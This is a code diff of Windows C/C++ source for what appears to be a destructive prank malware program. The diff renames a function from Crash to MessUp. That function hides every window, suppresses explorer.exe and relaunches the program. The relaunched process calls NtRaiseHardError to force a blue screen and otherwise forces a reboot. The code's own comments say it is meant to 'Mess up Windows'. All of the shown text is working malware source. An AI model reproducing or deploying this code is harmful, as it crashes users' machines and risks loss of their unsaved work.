@@ -198,13 +198,15 @@ DWORD __stdcall SuppressFileExplorer(void*)
 	}
 }
 
-void Crash()
+void MessUp()
 {
 	SendMessageA(HWND_BROADCAST, WM_SHOWWINDOW, 0, 1); //Hide all windows
 	CreateThread(0, 0, SuppressFileExplorer, 0, 0, 0); //Keep suppressing explorer.exe
 	
 	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
 	GetModuleFileNameA(0, exePath, 8192);
+
+	Sleep(5000);
 
 	STARTUPINFOA si;
 	PROCESS_INFORMATION pi;
@@ -213,8 +215,8 @@ void Crash()
 	si.cb = sizeof(si);
 	RtlZeroMemory(&pi, sizeof(pi));
 
-	for (int i = 0; i < 10; i++)
-		CreateProcessA(0, lstrcatA(exePath, " lol"), 0, 0, 0, 0, 0, 0, &si, &pi); //Create processes to trigger BSoD
+	CreateProcessA(0, lstrcatA(exePath, " lol"), 0, 0, 0, 0, 0, 0, &si, &pi);
+	TerminateProcess(pi.hProcess, 1337);
 }
 
 int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
@@ -232,8 +234,6 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 		}
 		else if (lstrcmpA(__argv[1], "lol") == 0)
 		{
-			Sleep(5000);
-
 			HANDLE token;
 			TOKEN_PRIVILEGES privileges;
 
@@ -251,6 +251,8 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 			((void(*)(ULONG, ULONG, ULONG, PULONG, ULONG, PULONG))NtRaiseHardError)(0xC0000001, 0, 0, 0, 6, &response); //Trigger BSoD
 
 			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN); //In case it didn't work, restart Windows
+
+			return 0;
 		}
 
 	char* exePath = (char*)LocalAlloc(LMEM_ZEROINIT, 8192);
@@ -273,7 +275,7 @@ int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
 
 	stop = true;
 
-	Crash(); //Mess up Windows
+	MessUp(); //Mess up Windows
 
 	while (true); //Hang
 }
